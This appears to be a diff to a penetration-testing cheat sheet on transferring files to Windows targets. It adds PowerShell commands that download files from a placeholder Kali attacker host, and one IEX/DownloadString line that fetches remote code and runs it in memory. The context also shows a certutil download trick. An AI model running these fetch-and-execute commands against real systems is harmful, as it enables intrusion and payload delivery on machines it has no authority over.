@@ -35,6 +35,16 @@ PowerShell
 Invoke-WebRequest -Uri 'http://<Kali IP>/<filename>' -OutFile <filename> 
 ```
 
+PowerShell from cmd
+```
+powershell.exe -command Invoke-WebRequest -Uri http://<Kali IP>/<filename> -OutFile <filename>
+```
+
+```
+powershell.exe IEX(New-Object Net.WebClient).downloadstring(http://<Kali IP>/<filename>)
+```
+
+
 Certutil
 ```
 certutil -urlcache -split -f 'http://<Kali IP>/<filename>' <path_destiny><filename>
